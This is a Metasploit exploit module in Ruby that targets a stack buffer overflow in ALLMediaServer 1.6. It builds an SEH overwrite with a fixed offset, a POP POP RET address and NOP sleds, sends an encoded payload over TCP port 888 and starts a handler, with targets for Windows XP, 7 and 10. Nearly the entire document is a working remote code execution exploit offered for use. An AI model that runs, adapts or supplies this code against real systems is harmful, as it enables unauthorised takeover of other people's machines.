##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# Author: Hejap Zairy
# Date: 1.08.2022
# Exploit Prof
# Proof and Exploit:
#image:https://i.imgur.com/yLrRR2t.png
#video:https://streamable.com/x4i50c



require 'msf/core'
 
class Metasploit4 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Seh
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'ALLMediaServer 1.6  Buffer Overflow',
            'Description'    => %q{
                This module exploits a stack buffer overflow in ALLMediaServer 1.6
                The vulnerability is caused due to a boundary error within the
                handling of HTTP request.
                Thank you Saud Alenazi and 0xSaudi 
                and Muhammad Al Ahmadi and all the friends in Tuwaiq i Love Tuwaiq
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Hejap Zairy Al-Sharif', # Remote exploit and Metasploit module
                ],
            'DefaultOptions' =>
                {
                    'ExitFunction' => 'process', #none/process/thread/seh
                },
            'Platform'       => 'win',
            'Payload'        =>
                {
                    'BadChars' => '\x00\x0a\x0d\xff' 
                },
 
            'Targets'        =>
                [
                    [ 'ALLMediaServer 1.6 / Windows 10  - English',
                        {
                            'Ret'       =>   0x0040590B, # POP ESI # POP EBX  # RET 
                            'Offset'    =>   1072
                        }
                    ],
                    [ 'ALLMediaServer 1.6 / Windows XP SP3 - English',
                        {
                            'Ret'       =>   0x0040590B, # POP ESI # POP EBX  # RET 
                            'Offset'    =>   1072
                        }
                    ],
                    [ 'ALLMediaServer 1.6 / Windows 7 SP1 - English',
                        {
                            'Ret'       =>   0x0040590B, # POP ESI # POP EBX  # RET 
                            'Offset'    =>   1072
                        }
                    ],
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Apr 1 2022',
            'DefaultTarget'  => 1))
 
        register_options([Opt::RPORT(888)], self.class)
 
    end
	
    def exploit
        connect
	buffer = ""
        buffer << make_nops(target['Offset'])
        buffer << "\xeb\x06\x90\x90"
        buffer << "\x0B\x59\x40\x00"
	buffer << make_nops(100)
        buffer << payload.encoded
        buffer << make_nops(50)
        print_status("Sending payload ... \n Exploit MediaServer")
        sock.put(buffer)
	handler
        disconnect
    end
end
